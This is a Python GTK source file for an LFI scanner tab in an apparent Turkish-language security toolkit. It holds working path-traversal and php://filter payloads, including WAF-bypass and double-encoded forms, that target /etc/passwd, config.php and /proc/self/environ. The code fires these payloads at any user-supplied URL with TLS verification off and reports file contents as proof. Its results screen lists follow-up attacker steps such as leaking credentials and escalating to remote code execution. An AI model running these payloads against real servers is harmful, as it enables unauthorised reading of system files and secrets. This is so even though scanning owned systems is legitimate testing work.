import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GLib
import threading
import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

LFI_PAYLOADS = [
    ("../../../../../../etc/passwd", "root:.*:0:0:", "Unix /etc/passwd"),
    ("....//....//....//etc/passwd", "root:.*:0:0:", "WAF-bypass (....//)"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:.*:0:0:", "URL-encoded traversal"),
    ("..%252f..%252f..%252f..%252fetc%252fpasswd", "root:.*:0:0:", "Cift URL-encoded"),
    ("/etc/passwd", "root:.*:0:0:", "Mutlak yol"),
    ("php://filter/convert.base64-encode/resource=config.php", "PD9waHA|<?php|base64", "PHP filter (base64)"),
    ("/proc/self/environ", "USER|PATH|HTTP_", "Environ bilgisi"),
    ("/etc/hosts", "localhost|127\\.0\\.0\\.1", "Host dosyasi"),
]

PARAM_NAMES = ["file", "page", "include", "path", "doc", "folder", "dir", "template", "view"]


class LfiScannerTab(Gtk.Box):
    def __init__(self):
        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        self.set_border_width(24)

        title = Gtk.Label(label="LFI Tarayici (Dosya Dahil Etme)")
        title.get_style_context().add_class("title-label")
        title.set_xalign(0)
        self.pack_start(title, False, False, 0)

        desc = Gtk.Label(label="Yerel dosya dahil etme (LFI) zafiyetini test eder. Uygulamalar dosya adlarini parametreden aldiklarinda '../../etc/passwd' gibi yollarla sunucu dosyalari okunabilir. Zaman asimina karsi tek seferde dener.")
        desc.get_style_context().add_class("desc-label")
        desc.set_line_wrap(True)
        desc.set_xalign(0)
        self.pack_start(desc, False, False, 0)

        sep = Gtk.Separator()
        self.pack_start(sep, False, False, 4)

        frame = Gtk.Frame(label="Hedef URL (dosya parametreli)")
        input_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8)
        input_box.set_border_width(16)

        hbox = Gtk.Box(spacing=8)
        hbox.set_halign(Gtk.Align.CENTER)
        self.entry = Gtk.Entry(placeholder_text="https://ornek.com/sayfa.php?file=index")
        self.entry.set_size_request(420, 30)
        self.entry.connect("activate", lambda _: self.start_scan())
        hbox.pack_start(self.entry, False, False, 0)
        self.scan_btn = Gtk.Button(label="Tara")
        self.scan_btn.connect("clicked", lambda _: self.start_scan())
        self.scan_btn.get_style_context().add_class("suggested-action")
        hbox.pack_start(self.scan_btn, False, False, 0)
        input_box.pack_start(hbox, False, False, 0)

        frame.add(input_box)
        self.pack_start(frame, False, False, 0)

        self.textview = Gtk.TextView()
        self.textview.set_editable(False)
        self.textview.set_monospace(True)
        self.textview.get_style_context().add_class("output-text")
        self.textbuffer = self.textview.get_buffer()
        sw = Gtk.ScrolledWindow()
        sw.set_policy(Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)
        sw.set_vexpand(True)
        sw.add(self.textview)
        self.pack_start(sw, True, True, 0)

        self.status_label = Gtk.Label(label="")
        self.pack_start(self.status_label, False, False, 0)

        self.running = False

    def log(self, text):
        end = self.textbuffer.get_end_iter()
        self.textbuffer.insert(end, text + "\n")

    def start_scan(self):
        url = self.entry.get_text().strip()
        if not url:
            self.status_label.set_text("URL girin")
            return
        if not url.startswith(("http://", "https://")):
            self.status_label.set_text("URL http/https ile baslamali")
            return
        if "?" not in url:
            self.status_label.set_text("URL bir parametre icermeli (ornek: ?file=index)")
            return
        if self.running:
            return
        self.running = True
        self.scan_btn.set_sensitive(False)
        self.textbuffer.set_text("")
        self.status_label.set_text("Taranıyor...")
        thread = threading.Thread(target=self.scan, args=(url,), daemon=True)
        thread.start()

    def build_url(self, url, param, payload):
        parts = urlparse(url)
        qs = parse_qs(parts.query, keep_blank_values=True)
        target = None
        for name in PARAM_NAMES:
            if name in qs:
                target = name
                break
        if target is None:
            target = param
        qs[target] = [payload]
        new_qs = urlencode(qs, doseq=True)
        return urlunparse((parts.scheme, parts.netloc, parts.path, parts.params, new_qs, parts.fragment))

    def scan(self, url):
        parts = urlparse(url)
        qs = parse_qs(parts.query)
        params_present = [p for p in PARAM_NAMES if p in qs] or list(qs.keys())[:3]
        if not params_present:
            params_present = ["file"]

        GLib.idle_add(self.log, f"[*] Hedef: {url}")
        GLib.idle_add(self.log, f"[*] Denenen parametreler: {', '.join(params_present)}\n")

        found = False
        for param in params_present:
            GLib.idle_add(self.log, f"--- Parametre: {param} ---")
            for payload, sig, name in LFI_PAYLOADS:
                target = self.build_url(url, param, payload)
                try:
                    r = requests.get(target, timeout=12, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                    body = r.text[:50000]
                    hit = re.search(sig, body, re.IGNORECASE | re.MULTILINE)
                    if hit:
                        found = True
                        GLib.idle_add(self.log, f"  [ZAFIYET!] {name}")
                        GLib.idle_add(self.log, f"    Payload: {payload}")
                        GLib.idle_add(self.log, f"    HTTP {r.status_code}")
                        sample = hit.group(0)[:200]
                        GLib.idle_add(self.log, f"    Kanit: {sample}")
                        GLib.idle_add(self.log, "")
                    else:
                        GLib.idle_add(self.log, f"  [-] {name} (HTTP {r.status_code})")
                except requests.exceptions.SSLError:
                    GLib.idle_add(self.log, f"  [-] {name} (SSL hatasi)")
                except requests.exceptions.Timeout:
                    GLib.idle_add(self.log, f"  [-] {name} (zaman asimi)")
                except Exception as e:
                    GLib.idle_add(self.log, f"  [-] {name} ({type(e).__name__})")
            GLib.idle_add(self.log, "")

        GLib.idle_add(self.log, "=== SONUC ===")
        if found:
            GLib.idle_add(self.log, "  [!] LFI zafiyeti tespit edildi!")
            GLib.idle_add(self.log, "  Saldirganin yapabilecekleri:")
            GLib.idle_add(self.log, "  - /etc/passwd ile kullanicilari okuma")
            GLib.idle_add(self.log, "  - .env / config dosyalari ile sifre ve API anahtari sizdirma")
            GLib.idle_add(self.log, "  - PHP filter ile kaynak kodunu base64 olarak sizdirma")
            GLib.idle_add(self.log, "  - /proc/self/environ ile degiskenleri gorme")
            GLib.idle_add(self.log, "  - Koşullar uygunsa RCE'ye (uzak komut) yukseltilebilir")
            GLib.idle_add(self.log, "  Cozum: kullanici girdisini dosya yolu olarak kullanmayin; beyaz liste uygulayin; realpath+prefix kontrolu yapin.")
        else:
            GLib.idle_add(self.log, "  [-] LFI zafiyeti bulunamadi (belirtilen parametrelerde).")
            GLib.idle_add(self.log, "  Not: fuzzing ve diger parametrelerde de denenmeli; WAF cevaplari yaniltici olabilir.")
        GLib.idle_add(self.finish_scan)

    def finish_scan(self):
        self.running = False
        self.scan_btn.set_sensitive(True)
        self.status_label.set_text("Tarama tamamlandi")
